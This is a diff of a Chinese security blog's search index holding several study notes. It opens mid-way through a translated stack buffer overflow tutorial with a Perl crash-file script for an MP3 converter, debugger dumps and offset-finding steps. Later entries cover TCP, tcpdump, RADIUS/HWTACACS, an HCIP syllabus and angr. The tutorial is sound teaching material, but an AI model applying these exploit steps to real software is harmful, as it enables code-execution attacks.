ebp</code></p><p>leave指令将EBP寄存器的内容复制到ESP寄存器中，<br>以释放分配给该过程的所有堆栈空间。然后，它从堆栈恢复EBP寄存器的旧值。</p></blockquote><p>在这个的例子中，我们有一个strcpy（）函数。</p><p>此函数将从[<code>Buffer</code>]指向的地址读取数据并将其存储，读取所有数据，直到看到空字节（字符串终止符）。当它复制数据时，ESP就会保持原样。strcpy（）不使用PUSH指令将数据放入堆栈……它基本上读取一个字节并使用索引将其写入堆栈（例如ESP，ESP + 1，ESP + 2等）。所以在复制之后，ESP仍然指向字符串的开头。</p><p><img src="12.png" srcset="/img/loading.gif" alt="12"></p><p>这意味着……如果[<code>Buffer</code>]中的数据略长于0x98字节，strcpy（）将覆盖已保存的EBP并最终保存EIP（依此类推）。毕竟，它只是继续读写，直到它到达源位置的空字节（如果是字符串）</p><p><img src="13.png" srcset="/img/loading.gif" alt="13"></p><p>ESP仍然指向字符串的开头。strcpy（）完成就好没有错。在strcpy（）之后，函数结束。这就是事情变得有趣的地方。函数结束处理启动。基本上，它会将ESP移回存储EIP的位置，它将发出RET。它将采用指针（在我们的情况下为AAAA或0x41414141，因为它被覆盖），并将跳转到该地址。</p><p>所以你控制EIP。</p><p>简而言之，通过控制EIP，您可以更改函数返回值来“恢复正常流量”。</p><p>当然，如果通过发出缓冲区溢出来更改此返回地址，则不再是“正常流程”。</p><p>所以…假设您可以覆盖MyVar，EBP，EIP中的缓冲区，并且在保存的EIP之前和之后您拥有A（您自己的代码）…想一想。发送缓冲区（[MyVar] [EBP] [EIP] [your_code]）后，ESP将/应指向[your_code]的开头。因此，如果您可以使EIP转到您的代码，那么您就可以控制。</p><blockquote><p>注意：当栈上的缓冲区溢出时，使用术语“基于栈的溢出”或“栈缓冲区溢出”。当您尝试写入栈帧的末尾时，将使用术语“栈溢出”。不要混淆这两者，因为它们完全不同。</p></blockquote><h2 id="调试器"><a href="#调试器" class="headerlink" title="调试器"></a>调试器</h2><p>为了查看堆栈的状态（以及寄存器的值，如指令指针，堆栈指针等），我们需要将调试器连接到应用程序，这样我们就可以看到应用程序运行时会发生什么（特别是当它dies时）。</p><p>有许多调试器可用于此目的。我经常使用的两个调试器是 Windbg.olldbg.Immunity 的调试器</p><p>下面是windbg调试器</p><p><img src="14.png" srcset="/img/loading.gif" alt="14"></p><p>您还可以通过设置以下注册表项来禁用“xxxx遇到问题并需要关闭”弹出窗口：HKLM \ Software \ Microsoft \ Windows NT \ CurrentVersion \ AeDebug \ Auto：设置为0</p><p><img src="15.png" srcset="/img/loading.gif" alt="15"></p><p>为了避免Windbg抱怨找不到符号文件，请在硬盘上创建一个文件夹（比方说c：\ windbgsymbols）。然后，在Windbg中，转到“文件” - “符号文件路径”并输入以下字符串：</p><p><code>SRV*C:\windbgsymbols*http://msdl.microsoft.com/download/symbols</code></p><p><strong>(不要在这个字符串后面加一个空行！确保此字符串是符号路径字段中唯一的字符串)</strong></p><blockquote><p>在继续之前的快速说明：在intel x86上，地址存储为little-endian（向后）。您看到的AAAA实际上是AAAA :-)（或者，如果您已在缓冲区中发送ABCD，则EIP将指向44434241（DCBA）</p></blockquote><h2 id="确定缓冲区大小以准确写入EIP"><a href="#确定缓冲区大小以准确写入EIP" class="headerlink" title="确定缓冲区大小以准确写入EIP"></a>确定缓冲区大小以准确写入EIP</h2><p>我们知道EIP位于缓冲区开头的20000到30000字节之间。现在，您可能会使用要覆盖EIP的地址覆盖20000到30000字节之间的所有内存空间。这可能有效，但如果您能找到执行覆盖的确切位置，它看起来会更好。为了确定缓冲区中EIP的确切偏移量，我们需要做一些额外的工作。</p><p>首先，让我们尝试通过稍微改变我们的perl脚本来缩小位置：</p><p>让我们减少一半。我们将创建一个包含25000个A和另外5000个B的文件。如果EIP包含41414141（AAAA），则EIP位于20000和25000之间，如果EIP包含42424242（BBBB），则EIP位于25000和30000之间。</p><pre><code>my $file= &quot;crash25000.m3u&quot;;my $junk = &quot;\x41&quot; x 25000;my $junk2 = &quot;\x42&quot; x 5000;open($FILE,&quot;&gt;$file&quot;);print $FILE $junk.$junk2;close($FILE);print &quot;m3u File Created successfully\n&quot;;</code></pre><p>创建文件并在Easy RM中打开crash25000.m3u到MP3。</p><p><img src="16.png" srcset="/img/loading.gif" alt="16"></p><p>好的，所以eip包含42424242（BBBB），所以我们知道EIP的偏移量在25000到30000之间。这也意味着我们应该/可能会看到ESP指向的内存中剩余的B（假设EIP在结束前被覆盖）30000字符缓冲区）</p><p>转储ESP的内容：</p><pre><code>0:000&gt; d esp000ff730  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff740  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff750  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff760  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff770  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff780  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff790  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff7a0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB0:000&gt; d000ff7b0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff7c0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff7d0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff7e0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff7f0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff800  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff810  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff820  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB0:000&gt; d000ff830  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff840  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff850  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff860  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff870  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff880  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff890  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB000ff8a0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</code></pre><p>但是这样来计算是不是太麻烦了呢，所以我们找个小工具来定位溢出点</p><p><code>gdb-peda</code>  这个插件需安装</p><pre><code>git clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit </code></pre><p>下面是基本使用</p><pre><code>gdbpattern_creat 5000 patter5000.txt #生成一个5000字节的测试字符到一个文本里</code></pre><p>原文后面就基本是例子演示，建议直接看原文</p><h2 id="查找写入shellcode的内存空间"><a href="#查找写入shellcode的内存空间" class="headerlink" title="查找写入shellcode的内存空间"></a>查找写入shellcode的内存空间</h2><p>我们控制EIP。因此，我们可以将EIP指向其他地方，包含我们自己的代码（shellcode）。但是这个空间在哪里，我们如何将我们的shellcode放在那个位置？我们如何让EIP跳转到那个位置？为了使应用程序崩溃，我们已经将26094 A写入内存，我们已经在保存的EIP字段（ret）中写入了一个新值，并且我们编写了一堆C语言。当应用程序崩溃时，请查看寄存器并转储所有寄存器（d esp，d eax，d ebx，d ebp，…）。如果你可以在其中一个寄存器中看到你的缓冲区（A或C），那么你可以用shellcode替换它们并跳转到那个位置。在我们的例子中，我们可以看到ESP似乎指向我们的C（记住上面的es esp的输出），所以理想情况下我们会把我们的shellcode而不是C，我们告诉EIP去ESP地址。尽管事实上我们可以看到C，但我们并不确定第一个C（地址为000ff730，ESP指向的地方）实际上是我们放入缓冲区的第一个C.我们将更改perl脚本并提供一个字符模式（我已经占用了144个字符，但你可以花费更多或更少）而不是C：</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>内存</tag>
+      
+      <tag>溢出</tag>
+      
+      <tag>栈</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>TCP总结</title>
+    <link href="undefined2019/05/14/TCP%E6%80%BB%E7%BB%93/"/>
+    <url>2019/05/14/TCP%E6%80%BB%E7%BB%93/</url>
+    
+    <content type="html"><![CDATA[<h2 id="这里总结下TCP的三次握手，数据传输和四次分手过程"><a href="#这里总结下TCP的三次握手，数据传输和四次分手过程" class="headerlink" title="这里总结下TCP的三次握手，数据传输和四次分手过程"></a>这里总结下TCP的三次握手，数据传输和四次分手过程</h2><p><img src="1.png" srcset="/img/loading.gif" alt="TCP图解"></p><p>pdf文件地址<a href="TCP图解.pdf">TCP图解</a></p><h2 id="TCP头部"><a href="#TCP头部" class="headerlink" title="TCP头部"></a>TCP头部</h2><p><img src="tcp%E5%A4%B4%E9%83%A8.png" srcset="/img/loading.gif" alt="tcp头部"></p><ul><li>来源连接端口（16位长）－识别发送连接端口</li><li>目的连接端口（16位长）－识别接收连接端口</li><li>序列号（seq，32位长）</li><li>如果含有同步化旗标（SYN），则此为最初的序列号；第一个数据比特的序列码为本序列号加一。</li><li>如果没有同步化旗标（SYN），则此为第一个数据比特的序列码。</li><li>确认号（ack，32位长）—期望收到的数据的开始序列号。也即已经收到的数据的字节长度加1。</li><li>数据偏移（4位长）—以4字节为单位计算出的数据段开始地址的偏移值。</li><li>保留（3比特长）—须置0</li><li>标志符（9比特长）<ul><li>NS—ECN-nonce。</li><li>CWR—Congestion Window Reduced。</li><li>ECE—ECN-Echo有两种意思，取决于SYN标志的值。</li><li>URG—为1表示高优先级数据包，紧急指针字段有效。</li><li>ACK—为1表示确认号字段有效</li><li>PSH—为1表示是带有PUSH标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。</li><li>RST—为1表示出现严重差错。可能需要重现创建TCP连接。还可以用于拒绝非法的报文段和拒绝连接请求。</li><li>SYN—为1表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步</li><li>FIN—为1表示发送方没有数据要传输了，要求释放连接。</li></ul></li><li>窗口（WIN，16位长）—表示从确认号开始，本报文的接受方可以接收的字节数，即接收窗口大小。用于流量控制。</li><li>校验和（Checksum，16位长）—对整个的TCP报文段，包括TCP头部和TCP数据，以16位字进行计算所得。这是一个强制性的字段。</li><li>紧急指针（16位长）—本报文段中的紧急数据的最后一个字节的序号。</li><li>选项字段—最多40字节。每个选项的开始是1字节的kind字段，说明选项的类型。<ul><li>0：选项表结束（1字节）</li><li>1：无操作（1字节）用于选项字段之间的字边界对齐。</li><li>2：最大报文段长度（4字节，Maximum Segment Size，MSS）通常在创建连接而设置SYN标志的数据包中指明这个选项，指明本端所能接收的最大长度的报文段。通常将MSS设置为（MTU-40）字节，携带TCP报文段的IP数据报的长度就不会超过* MTU（MTU最大长度为1518字节，最短为64字节），从而避免本机发生IP分片。只能出现在同步报文段中，否则将被忽略。</li><li>3：窗口扩大因子（4字节，wscale），取值0-14。用来把TCP的窗口的值左移的位数，使窗口值乘倍。只能出现在同步报文段中，否则将被忽略。这是因为现在的TCP接收数据缓冲区（接收窗口）的长度通常大于65535字节。</li><li>4：sackOK—发送端支持并同意使用SACK选项。</li><li>5：SACK实际工作的选项。</li><li>8：时间戳（10字节，TCP Timestamps Option，TSopt）<ul><li>发送端的时间戳（Timestamp Value field，TSval，4字节）</li><li>时间戳回显应答（Timestamp Echo Reply field，TSecr，4字节）* </li></ul></li></ul></li></ul><h2 id="TCP连接过程"><a href="#TCP连接过程" class="headerlink" title="TCP连接过程"></a>TCP连接过程</h2><p>第一步：客户端第一次会将标志位的第8位（syn）置1，服务器端接受到这个包后，就知道有人想要链接自己。</p><p>第二步：服务器会回一个包，并把标志位的第5位（ACk）和第八位（SYN）都置1，因为第一步发过来的序列号（seq）为0，所以第二步回的这个包的确认号（ack）为(seq+1)0+1，这里的seq是上一个从客户端接收到的包的seq） <strong>注意这个ack不是标志位的ACK，这个是来确认对方发过来的包的序列</strong></p><p>第三步：客户端仅把标志位的第5位（ACk）置1，然后 确认号（ack）为(seq+1)0+1（这里的seq是上一个从服务器接收到的包的seq），自己的seq值则为1了</p><p>seq，是自己自己确认发送包的序列，因为tcp可能会把大的消息切成一个一个的数据段，传输过去再按序列号拼接成原来的完整数据。因为这个ack这个机制所以说tcp是可靠连接。。。</p><h2 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h2><p>这个没什么特别的，一边发一边回复ack确认。如果没收到ack启动重传机制</p><h2 id="TCP断开过程"><a href="#TCP断开过程" class="headerlink" title="TCP断开过程"></a>TCP断开过程</h2><p>我们说所说的四次分手</p><p>主要是FIN标志位，如果一个<strong>报文段FIN标志位置1</strong>，则说明他要发送的数据发完了，他要关闭这个会话了。</p><p>直接看上面图上最后四步，断开是两个人的事。如果只有一边发送了FIN报文，这个时候还是可以传输数据的，因为还没有完全断开，只有双方互发了FIN报文，并且都收到了相应的ACK确认报文，这就完全断开了。本次TCP会话也就完全结束了。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>TCP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>https 工作原理</title>
+    <link href="undefined2019/05/13/https%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
+    <url>2019/05/13/https%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
+    
+    <content type="html"><![CDATA[<p>https学习资料</p><p><a href="https://www.kuacg.com/22672.html" target="_blank" rel="noopener">https基本原理1</a></p><p><a href="https://blog.51cto.com/11883699/2160032" target="_blank" rel="noopener">https基本原理2</a></p><p><a href="https://www.cnblogs.com/dinglin1/p/9279831.html" target="_blank" rel="noopener">ssl原理解释</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>https</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>tcpdump 记录</title>
+    <link href="undefined2019/05/13/tcpdump-%E8%AE%B0%E5%BD%95/"/>
+    <url>2019/05/13/tcpdump-%E8%AE%B0%E5%BD%95/</url>
+    
+    <content type="html"><![CDATA[<h3 id="tcpdump一些常用的选项。"><a href="#tcpdump一些常用的选项。" class="headerlink" title="tcpdump一些常用的选项。"></a>tcpdump一些常用的选项。</h3><p>-s number：tcpdump默认只会截取前96字节的内容，要想截取所有的报文内容，就需要使用这个选项，其中number是需要截取的报文字节数，如果是0的话，表示截取报文全部内容；</p><p>-nn：表示不解析域名，直接显示IP，在netstat命令中，也有这个选项；</p><p>-X：同时使用hex和ascii显示报文内容；</p><p>-S：显示绝对的序列号（sequence number），而不是相对编号；</p><p>-i：指定监听的网卡，如果为-i any则表示监听所有的网卡；</p><p>-v，-vv，-vvv：显示更多的详细信息；</p><p>-c number：表示截取number个报文，然后结束；</p><p>-w：将监听到的数据包写入文件中保存，而并不分析和打印出来；</p><p>-A：只使用ascii打印报文的全部数据，不要和-X选项一起使用。截取HTTP请求的时候可以用sudo tcpdump -nSA port 80</p><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>先进行使用实例详解时，有必要先掌握tcpdump一些基本的使用理论知识，先来说说过滤器。</p><p>在服务器上的网络报文是异常的多，很多时候我们只关注和具体问题有关的数据报文，而这些有用的报文只占到很小的一部分，学习一下tcpdump提供的灵活而且功能强大的过滤器。</p><p>过滤器也可以简单地分为三类：type，dir和proto。</p><p>type：主要用来区分过滤报文源类型，主要由host主机报文，net网段报文和port指定端口的报文组成；</p><p>dir：只过滤报文的源地址和目的地址，主要包括src源地址和dst目的地址；</p><p>proto：只过滤报文的协议类型，支持tcp，udp和icmp等；使用的时候可以省略<br>proto关键字：</p><p>tcpdump -i eth1 arp</p><p>tcpdump -i eth1 ip</p><p>tcpdump -i eth1 tcp</p><p>tcpdump -i eth1 udp</p><p>tcpdump -i eth1 icmp</p><p>在我们使用tcpdump命令时是离不开这些过滤器的。</p><h3 id="条件组合"><a href="#条件组合" class="headerlink" title="条件组合"></a>条件组合</h3><p>在茫茫网络中，想要找到那个你想要的网络包，还是有一定难度的。为了抓住那个我们想要的网络包，在我们抓包命令中，包含越多的限制条件，抓的无关包就会越少，所以在进行抓包时，我们可以使用“与”（and、&amp;&amp;）、“或”（or、||）和“非”（not、!）来将多个条件组合起来。这对我们需要基于某些条件来分析网络包是非常有用的。</p><h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><ul><li>命令：tcpdump -i eth1</li></ul><p>说明：监视指定网络接口的数据包</p><ul><li>命令：tcpdump host 210.27.48.3</li></ul><p>说明：截获210.27.48.3主机收到的和发出的所有数据包</p><ul><li>命令：tcpdump host 210.27.48.4 and (210.27.48.5 or 210.27.48.6)</li></ul><p>说明：截获210.27.48.3主机和210.27.48.5或者210.27.48.6主机进行通信的所<br>有数据包</p><ul><li>命令：tcpdump net 192.168.1.0/24</li></ul><p>说明：截获192.168.1.0/24整个网络的数据包</p><ul><li>命令：tcpdump -i eth0 src host 210.27.48.3</li></ul><p>说明：监视eth0网卡上源地址是210.27.48.3的所有网络包</p><ul><li>命令：tcpdump -i eth0 dst host 210.27.48.3</li></ul><p>说明：监视eth0网卡上目的地址是210.27.48.3的所有网络包</p><ul><li>命令：tcpdump tcp port 23 and host 210.27.48.3</li></ul><p>说明：获取主机210.27.48.3上端口为23的应用发出和接收的所有TCP协议包</p><ul><li>命令：tcpdump udp port 123</li></ul><p>说明：获取本机123端口发出和接收的所有UDP协议包</p><ul><li>命令：tcpdump src host 10.126.1.222 and dst net 10.126.1.0/24</li></ul><p>说明：截获源主地址为10.126.1.222，目的地址是10.126.1.0/24整个网络</p><ul><li>命令：tcpdump -i eth0 -s0 -G 60 -Z root -w %Y_%m%d_%H%M_%S.pcap</li></ul><p>说明：抓取报文后按照指定时间间隔保存；-G选项后面接时间，单位为秒；上述命令就是每隔60秒生存一个文件</p><ul><li>命令：tcpdump -i eth0 -s0 -C 1 -Z root -w eth0Packet.pcap</li></ul><p>说明：抓取报文后按照指定报文大小保存；-C选项后接文件大小，单位为MB；上述命令就是每抓包文件达到1MB时就使用一个新的文件保存新抓的报文</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>TcpDump</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>HWTACACS和RADIUS的区别</title>
+    <link href="undefined2019/05/12/HWTACACS%E5%92%8CRADIUS%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
+    <url>2019/05/12/HWTACACS%E5%92%8CRADIUS%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
+    
+    <content type="html"><![CDATA[<h2 id="一-HWTACACS和RADIUS的区别"><a href="#一-HWTACACS和RADIUS的区别" class="headerlink" title="一 HWTACACS和RADIUS的区别"></a>一 HWTACACS和RADIUS的区别</h2><p><img src="%5CHCIP-security%E4%BA%86%E8%A7%A3%5C1.png" srcset="/img/loading.gif" alt="diff"></p><h3 id="1-传输层协议"><a href="#1-传输层协议" class="headerlink" title="1 传输层协议"></a>1 传输层协议</h3><p>两者使用的传输层协议不同，HWTACACS使用的是TCP，而RADIUS采用的是UDP；</p><h3 id="2-认证、授权方式"><a href="#2-认证、授权方式" class="headerlink" title="2 认证、授权方式"></a>2 认证、授权方式</h3><p>HWTACACS的认证、授权相互独立，如果把命令行设置为HWTACACS模式，则这个命令行的每一条命令都需要经过认证。而RADIUS的认证和授权是捆在一起的；</p><h3 id="3-加密方式"><a href="#3-加密方式" class="headerlink" title="3 加密方式"></a>3 加密方式</h3><p>HWTACACS对用户报文会进行整个加密，而RADIUS仅对用户密码进行加密。</p><h2 id="二-HWTACACS和RADIUS使用场合"><a href="#二-HWTACACS和RADIUS使用场合" class="headerlink" title="二 HWTACACS和RADIUS使用场合"></a>二 HWTACACS和RADIUS使用场合</h2><p>当用户需从本地网络与NAS建立连接从而取得访问其他网络的权利或取得使用某些网络资源时，一般都需对此类用户接入请求进行认证、授权和计费等。认证为合法用户将被分配网络资源，同时可对用户上线时间统计计时，并拒绝非法用户的请求。电信运营商和一些院校及企事业单位一般都采用HWTACACS或RADIUS服务器对接入用户进行有效控制，保证网络安全性和计时（方便计费）。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>HCIP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>HCIP-security了解</title>
+    <link href="undefined2019/05/11/HCIP-security%E4%BA%86%E8%A7%A3/"/>
+    <url>2019/05/11/HCIP-security%E4%BA%86%E8%A7%A3/</url>
+    
+    <content type="html"><![CDATA[<h1 id="HCIP-Security-知识架构"><a href="#HCIP-Security-知识架构" class="headerlink" title="HCIP-Security 知识架构"></a>HCIP-Security 知识架构</h1><h2 id="HCP1-HCIP-Security-CISN构建安全网络架构"><a href="#HCP1-HCIP-Security-CISN构建安全网络架构" class="headerlink" title="HCP1 HCIP-Security CISN构建安全网络架构"></a>HCP1 HCIP-Security CISN构建安全网络架构</h2><pre><code> * 网络安全设备管理     *   网络安全设备介绍     *   网络安全设备管理     *   网络安全设备日志分析     *   网络安全设备统一运维 * 防火墙带宽管理     *   防火墙带宽管理概述     *   防火墙带宽管理实现原理     *   防火墙带宽管理配置部署     *   防火墙带宽管理故障排除 * 防火墙负载均衡     *   服务器负载均衡概述     *   服务器负载均衡实现原理     *   服务器负载均衡配置部署 * 防火墙高可靠性     *   BFD技术     *   IP-Link技术     *   Link-Group技术     *   Eth-Trunk技术     *   Bypass技术     *   双机热备技术     *   双机热备故障排除 * 防火墙虚拟系统     *   虚拟系统概述     *   虚拟系统实现原理     *   虚拟系统配置部署     *   虚拟系统故障排除 * IPSec VPN高级应用     *   IPSec VPN概述     *   IPSec VPN实现原理     *   IPSec VPN配置部署     *   IPSec VPN故障排除 * SSL VPN高级应用     *   SSL VPN概述     *   SSL VPN实现原理     *   SSL VPN配置部署     *   SSL VPN故障排除 * 网络安全智能运维     *   防火墙智能选路     *   防火墙智能策略 * 防火墙虚拟化技术     *   虚拟化安全的趋势与挑战     *   华为USG6000V价值功能     *   虚拟防火墙典型应用场景</code></pre><h2 id="HCP2-HCIP-Security-CSSN构建内容安全网络"><a href="#HCP2-HCIP-Security-CSSN构建内容安全网络" class="headerlink" title="HCP2 HCIP-Security CSSN构建内容安全网络"></a>HCP2 HCIP-Security CSSN构建内容安全网络</h2><pre><code> * 内容安全概述     *   信息安全基础知识     *   内容安全背景介绍     *   内容安全技术简介     *   IAE检测引擎介绍 * 内容安全过滤技术     *   内容安全过滤技术产生的背景     *   文件过滤特性介绍     *   内容过滤特性介绍     *   邮件过滤特性介绍     *   应用行为控制技术原理     *   内容安全过滤技术配置     *   内容安全过滤技术特性故障处理 * Web安全防护     *   Web安全防护概述     *   URL过滤技术     *   Web应用系统防护技术     *   恶意网页检测关键技术 * 入侵检测与防御技术基础     *   信息系统发展现状     *   入侵检测系统的引入     *   入侵防御系统的引入 * 入侵检测与防御技术应用     *   入侵检测与防御技术应用-NIP     *   防火墙IPS特性 * 反病毒技术     *   计算机病毒基础概述     *   反病毒技术介绍     *   病毒特征及常用检测工具介绍     *   网关防病毒技术应用 * 网络型攻击防范技术     *   网络攻击介绍     *   单包攻击技术及防御方法     *   流量型攻击（DDoS)介绍     *   Anti-DDoS解决方案     *   其它流量型攻击防御方法     *   网络攻击与防范组网场景简介 * 大数据安全与云安全技术     *   沙箱技术简介     *   CIS技术     *   大数据安全解决方案     *   云安全技术概览</code></pre><h2 id="HCP3-HCIP-Security-CTSS构建终端安全体系"><a href="#HCP3-HCIP-Security-CTSS构建终端安全体系" class="headerlink" title="HCP3 HCIP-Security CTSS构建终端安全体系"></a>HCP3 HCIP-Security CTSS构建终端安全体系</h2><pre><code> * 企业终端安全概述     *   企业终端安全风险     *   终端安全系统设计     *   华为终端安全解决方案简介 * 用户接入认证技术     *   用户接入认证技术概览     *   身份认证技术     *   安全认证技术     *   准入控制技术     *   敏捷安全技术 * 无线网络安全技术     *   WLAN概述     *   WLAN安全概述     *   WLAN安全威胁     *   WIDS/WIPS系统原理     *   WLAN用户接入安全     *   CAWAP加密及用户授权管理 * Agile Controller-Campus产品安装     *   AC安装规划     *   AC系统安装     *   AC初始化配置     *   AC卸载步骤     *   AC高可靠性部署 * 终端安全系统部署     *   802.1X     *   MAC/MAB     *   portal     *   SACG     *   业务随行 * 企业网络接入用户管理     *   用户管理     *   访客管理 * BYOD移动办公系统     *   BYOD应用场景介绍     *   BYOD安装部署（简单带过）     *   BYOD功能部署     *   移动终端管理 * 终端安全管理     *   终端安全规则管理     *   软件分发管理     *   资产管理     *   补丁管理     *   AC系统维护 * 终端安全系统故障处理     *   终端安全系统故障概述     *   终端安全系统故障诊断和处理     *   终端安全系统故障处理案例</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>HCIP</tag>
+      
+      <tag>计算机网络</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>angr学习文档</title>
+    <link href="undefined2019/04/29/angr%E5%AD%A6%E4%B9%A0%E6%96%87%E6%A1%A3/"/>
+    <url>2019/04/29/angr%E5%AD%A6%E4%B9%A0%E6%96%87%E6%A1%A3/</url>
+    
+    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>不会建议直接上docker 大是大了点，但是是相对很简单的事</p><h2 id="官方文档翻译"><a href="#官方文档翻译" class="headerlink" title="官方文档翻译"></a>官方文档翻译</h2><p><a href="https://docs.angr.io/core-concepts/toplevel" target="_blank" rel="noopener">angr Documentation</a><br>我们首先要了解angr的构造，开始第一步肯定是导入二进制程序</p><pre><code>&gt;&gt;&gt; import angr&gt;&gt;&gt; proj = angr.Project(&#39;/bin/true&#39;)</code></pre><p>之后我们的操作都会基于这个proj对象，</p><h3 id="基础属性"><a href="#基础属性" class="headerlink" title="基础属性"></a>基础属性</h3><pre><code>&gt;&gt;&gt; import monkeyhex //将以十六进制格式化数值输出结果&gt;&gt;&gt; proj.arch //程序的&lt;Arch AMD64 (LE)&gt;&gt;&gt;&gt; proj.entry //程序入口处0x401670&gt;&gt;&gt; proj.filename //程序二进制地址&#39;/bin/true&#39;</code></pre><h3 id="The-loader-方法"><a href="#The-loader-方法" class="headerlink" title="The loader 方法"></a>The loader 方法</h3><p>从二进制文件转变为虚拟地址空间的表现形式的过程是十分复杂的。我们有一个名为CLE的模块来处理这个过程。CLE的结果，称为loader，可通过.loader属性来进行操控。</p><pre><code>&gt;&gt;&gt; proj.loader&lt;Loaded true, maps [0x400000:0x5004000]&gt;&gt;&gt;&gt; proj.loader.shared_objects # may look a little different for you!{&#39;ld-linux-x86-64.so.2&#39;: &lt;ELF Object ld-2.24.so, maps [0x2000000:0x2227167]&gt;,&#39;libc.so.6&#39;: &lt;ELF Object libc-2.24.so, maps [0x1000000:0x13c699f]&gt;}&gt;&gt;&gt; proj.loader.min_addr0x400000&gt;&gt;&gt; proj.loader.max_addr0x5004000&gt;&gt;&gt; proj.loader.main_object # we&#39;ve loaded several binaries into this project. Here&#39;s the main one!&lt;ELF Object true, maps [0x400000:0x60721f]&gt;&gt;&gt;&gt; proj.loader.main_object.execstack # sample query: does this binary have an executable stack?False&gt;&gt;&gt; proj.loader.main_object.pic # sample query: is this binary position-independent?</code></pre><h3 id="the-factory"><a href="#the-factory" class="headerlink" title="the factory"></a>the factory</h3><p>在angr中有非常多的类，它们中的大多数都需要project来进行实例化。为了不让你到处传递project，我们提供了project.factory，它有一些你会经常用到的对象的构造器。</p><p>本节还会介绍angr的几种基本概念，系好安全带！</p><p>blocks</p><p>首先，有一个project.factory.block()的构造器，它用来提取一个指定地址的代码基本块。一个重要的事实是，angr分析的代码是使用基本块作为单元相连的。该构造器返回一个Block对象，它可以告诉你一些关于代码块的有趣信息</p><pre><code>&gt;&gt;&gt; block = proj.factory.block(proj.entry) # 从程序入口点枚举一个基本块&lt;Block for 0x401670, 42 bytes&gt;&gt;&gt;&gt; block.pp() # 打印反汇编形式0x401670: xor ebp, ebp0x401672: mov r9, rdx0x401675: pop rsi0x401676: mov rdx, rsp0x401679: and rsp, 0xfffffffffffffff00x40167d: push rax0x40167e: push rsp0x40167f: lea r8, [rip + 0x2e2a]0x401686: lea rcx, [rip + 0x2db3]0x40168d: lea rdi, [rip - 0xd4]0x401694: call qword ptr [rip + 0x205866]&gt;&gt;&gt; block.instructions # 指令数量0xb&gt;&gt;&gt; block.instruction_addrs # 每条指令对应的地址[0x401670, 0x401672, 0x401675, 0x401676, 0x401679, 